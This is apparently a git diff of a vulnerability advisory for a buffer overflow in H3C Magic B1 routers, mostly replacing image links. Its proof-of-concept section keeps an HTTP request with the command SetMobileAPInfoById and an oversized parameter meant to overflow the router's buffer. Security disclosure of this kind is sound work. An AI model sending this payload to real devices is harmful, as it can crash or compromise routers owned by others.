@@ -19,12 +19,13 @@ H3C routers have been found to have a buffer overflow vulnerability. Magic B1 mo
 # Vulnerability details
 
 Here is the entry of the request function
+<img width="1306" height="270" alt="2845cfc9-ccf3-4f41-9fb9-a97bafdd9d2e" src="https://github.com/user-attachments/assets/f9064ce8-4d46-4baf-9d8c-a8f824dd97eb" />
 
-![image-20250414182529295](7/image-20250414182529295.png)
 
 There is no length limit when copying the format, which leads to buffer overflow.
 
-![image-20250414182713059](7/image-20250414182713059.png)
+<img width="1419" height="679" alt="image" src="https://github.com/user-attachments/assets/04633402-362f-4987-9de1-e5595eebf497" />
+
 
 # POC
 
@@ -47,6 +48,4 @@ Connection: close
 CMD=SetMobileAPInfoById&param=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;bb
 ```
 
-
-
-![image-20250414182732653](7/image-20250414182732653.png)
+<img width="1870" height="822" alt="185f88bf-ec4f-4f2b-ab97-4b2555c41c64" src="https://github.com/user-attachments/assets/aa8418e8-381a-41f9-8fb4-498706140074" />
